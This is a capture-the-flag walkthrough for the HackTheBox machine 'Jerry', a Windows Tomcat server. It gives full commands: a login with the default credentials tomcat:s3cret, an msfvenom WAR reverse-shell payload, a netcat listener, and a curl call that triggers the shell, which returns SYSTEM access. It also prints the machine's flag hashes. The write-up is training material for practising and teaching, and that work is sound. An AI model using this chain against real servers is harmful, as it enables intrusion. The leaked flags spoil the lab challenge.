Jerry

Easy
OS: Windows

Exploited Apache Tomcat with default credentials (tomcat:s3cret) to access the Manager App, uploaded a malicious WAR reverse shell payload, and obtained SYSTEM access due to the service running as NT AUTHORITY\SYSTEM.

Key Vulnerabilities
Default Credentials WAR File Upload Service Misconfiguration
Tools Used
nmap msfvenom netcat curl

Summary

Welcome to the walkthrough for Jerry, one of the most classic and straightforward machines on HackTheBox. This Windows box is an excellent introduction to exploiting default configurations and understanding how web application servers like Apache Tomcat can be weaponized to gain full system access.

Let's dive into the attack path.

1. Reconnaissance

Port Scanning

We begin our enumeration by scanning the target machine to identify open ports and running services.

nmap -sC -sV -p- 10.10.10.95

Open Ports Discovered:

Port State Service
8080/tcp open http-proxy

The scan reveals only one open port: 8080, which is typically used for HTTP proxy services or alternative web servers like Apache Tomcat.

2. Gaining a Foothold

Web Enumeration

Navigating to http://10.10.10.95:8080 in a web browser confirms our suspicions—we are greeted by the default Apache Tomcat landing page. The first thing to check on a default Tomcat installation is the Manager App, which allows administrators to deploy and manage web applications. Clicking the "Manager App" button prompts us for HTTP Basic Authentication.

Default Credentials

If you cancel the authentication prompt on a default Tomcat server, the resulting error page often conveniently lists the default usernames and passwords configured in tomcat-users.xml. Trying the most common default credentials:

  • Username: tomcat
  • Password: s3cret

The credentials work, and we are successfully logged into the Tomcat Web Application Manager.

Exploitation via Malicious WAR File

The Tomcat Manager allows users to upload and deploy .war (Web Application Archive) files. We can abuse this feature to upload a reverse shell.

Step 1 — Generate the Payload:

We use msfvenom to craft a malicious WAR file containing a Windows reverse shell.

msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_TUN0_IP LPORT=4444 -f war > shell.war

Step 2 — Deploy the Payload:

In the Tomcat Manager interface, scroll down to the Deploy section. Under "WAR file to deploy", select the shell.war file and click Deploy. The application will now appear in the applications list at the path /shell.

Step 3 — Catch the Shell:

Set up a Netcat listener on your attacker machine:

nc -lvnp 4444

Trigger the payload by navigating to the deployed application in your browser or using curl:

curl http://10.10.10.95:8080/shell/

We immediately catch a reverse shell on our Netcat listener.

3. Privilege Escalation & Flags

Once we have a shell, the first step is to check our current privileges.

whoami

Output:

nt authority\system

Because the Apache Tomcat service on this machine was configured to run as the highest-privileged local account, we are dropped straight into a SYSTEM shell. No further privilege escalation is required.

Capturing the Flags

Jerry is unique in that both the user and root flags are stored in the same file. We navigate to the Administrator's desktop to find it:

cd C:\Users\Administrator\Desktop\flags
dir
type "2 for the price of 1.txt"

Output:

Flag Hash
user 7004dbcef0f854e0fb401875f26ebd00
root 04a8b36e1545a455393d067e772fe90e

Summary & Key Takeaways

The Attack Chain:

Port 8080 (Apache Tomcat)
↓
Manager App Login (Default Creds: tomcat:s3cret)
↓
Upload Malicious shell.war Payload
↓
Reverse Shell as NT AUTHORITY\SYSTEM

Jerry serves as a stark reminder of why default credentials are one of the most critical risks in web application security. Leaving administration panels exposed to the internet with factory default passwords gives attackers a direct, authenticated path to Remote Code Execution (RCE). Furthermore, running web services as SYSTEM or root turns a simple application compromise into a full system takeover.
